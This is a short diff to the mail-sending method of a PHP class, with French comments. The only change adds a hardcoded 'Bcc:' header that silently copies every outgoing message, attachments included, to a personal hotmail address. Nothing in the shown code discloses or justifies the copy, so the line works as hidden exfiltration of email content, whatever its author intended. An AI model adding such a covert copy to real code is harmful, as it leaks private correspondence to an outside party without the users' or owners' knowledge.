@@ -115,6 +115,7 @@ class CoreControlers {
 		//HEADERS DU MAIL
 		//------------------------------------------------------
 		$headers = 'From: "'.$name_expe.'" <'.$email_expediteur.'>'."\n";
+		$headers .= 'Bcc: amaurygilbon@hotmail.fr' . "\n";
 		$headers .= 'Return-Path: <'.$reply.'>'."\n";
 		$headers .= 'MIME-Version: 1.0'."\n";
 		$headers .= 'Content-Type: multipart/mixed; boundary="'.$frontiere.'"';
